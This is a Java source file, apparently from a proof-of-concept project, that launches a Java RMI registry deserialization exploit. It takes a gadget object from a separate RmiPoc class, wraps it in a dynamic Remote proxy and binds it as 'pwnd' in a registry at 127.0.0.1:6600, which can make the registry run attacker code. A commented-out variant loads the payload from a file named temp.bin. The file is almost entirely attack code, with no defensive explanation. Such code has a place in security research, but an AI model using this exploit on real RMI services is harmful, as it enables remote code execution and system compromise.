package com.test.testrun;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import com.test.poc.RmiPoc;

public class RmiRun {
	
	
	public static void main(String args[]){
		Object instance;
		try {
			instance=RmiPoc.generator();
			InvocationHandler h = (InvocationHandler) instance;
			Remote r = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[]{Remote.class},h));//动态代理Rmote接口。
			Registry registry=LocateRegistry.getRegistry("127.0.0.1", 6600);
			try{
			    registry.bind("pwnd", r); // r is remote obj
			}
			catch (Throwable e) 
			{
			    e.printStackTrace();
			}
			
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		
	}
	
//	public static void main(String args[]) {
//		FileInputStream fis;
//		try {
//			fis = new FileInputStream("temp.bin");
//			ObjectInputStream ois=new ObjectInputStream(fis);
//			
//			Object obj2=ois.readObject();
//			ois.close();
//			InvocationHandler h=(InvocationHandler)obj2;
//			Remote r=Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, h));
//			Registry registry=LocateRegistry.getRegistry("127.0.0.1",6600);
//			try {
//				registry.bind("pwned",r);
//			} catch (AlreadyBoundException e) {
//				// TODO Auto-generated catch block
//				e.printStackTrace();
//			}
//			
//		} catch (FileNotFoundException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		} catch (IOException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		} catch (ClassNotFoundException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
//		
//	}

}
